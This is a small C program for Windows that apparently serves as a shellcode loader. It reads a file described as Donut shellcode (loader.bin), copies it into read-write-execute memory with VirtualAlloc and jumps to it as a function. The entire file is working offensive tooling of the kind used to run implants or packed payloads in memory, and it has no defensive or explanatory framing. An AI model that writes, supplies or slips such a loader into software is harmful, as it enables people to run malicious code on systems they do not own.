#include <windows.h>
#include <stdio.h>
void execute_shellcode(unsigned char *shellcode, long shellcodeSize);
int main() {
    // File path to the Donut shellcode binary
    const char *shellcodeFile = "loader.bin";
    FILE *file;
    long shellcodeSize;
    unsigned char *shellcode;

    // Open the shellcode file
    file = fopen(shellcodeFile, "rb");
    if (file == NULL) {
        printf("Error: Could not open shellcode file\n");
        return 1;
    }

    // Get the size of the shellcode file
    fseek(file, 0, SEEK_END);
    shellcodeSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory to hold the shellcode
    shellcode = (unsigned char *)malloc(shellcodeSize);
    if (shellcode == NULL) {
        printf("Error: Could not allocate memory for shellcode\n");
        fclose(file);
        return 1;
    }

    // Read the shellcode into the buffer
    fread(shellcode, 1, shellcodeSize, file);
    fclose(file);
    execute_shellcode(shellcode,shellcodeSize);
    return 0;
}
void execute_shellcode(unsigned char *shellcode, long shellcodeSize){
    void *execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execMem, shellcode, shellcodeSize);
    free(shellcode);
    void (*execFunc)() = (void(*)())execMem;
    execFunc();
    VirtualFree(execMem, 0, MEM_RELEASE);
}

